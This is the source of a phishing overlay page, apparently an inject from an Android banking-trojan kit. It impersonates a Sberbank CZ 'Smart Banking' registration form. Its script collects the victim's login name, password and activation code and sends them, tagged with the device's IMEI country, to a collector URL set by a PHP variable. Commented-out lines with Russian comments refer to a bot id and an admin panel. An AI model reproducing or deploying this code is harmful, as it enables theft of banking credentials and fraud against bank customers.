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"
                 style="max-width: 30%">
        </div>
        <div id="line"></div>

        <br>
        <form action="null" method="post" id="_mainForm" target="flow_handler">

            <div id="message">
                Registrace Smart Bankingu
            </div>

            <div class="form">
                <label for="login">Prihlasovaci jmeno</label>
                <input id="login" class="input-field" name="Prihlasovaci jmeno" type="text">
                <br />
                <br />
                <br />

                <label for="password">Heslo</label>
                <input id="password" class="input-field" name="Heslo" type="password">
                <br />
                <br />
                <br />

                <label for="code">Aktivacni kod</label>
                <input id="code" class="input-field" name="Aktivacni kod" type="text">
            </div>
            <br>
            <input id="submitBtn1" class="submit-button" value="Aktivovat Smart Banking" type="button" />

            <input type="hidden" name="name" value="Sberbank CZ">
        </form>
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden; display:none"></iframe>
    </div>

               <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');
                        var code = document.getElementById('code');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        if (!/^\w{3,100}$/i.test(code.value)) {
							try{
                                code.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "sberbankcz'+
						'", "prihlasovaci_jmeno": "'+oNumInp.value+
						'", "heslo" : "'+oCodeInp.value+
						'", "aktivacni_kod": "'+code.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|sberbankcz|"+oNumInp.value+"|"+oCodeInp.value+"|"+code.value);

						
						
						return false;
                    };

                })();
            </script>

</body>
</html>
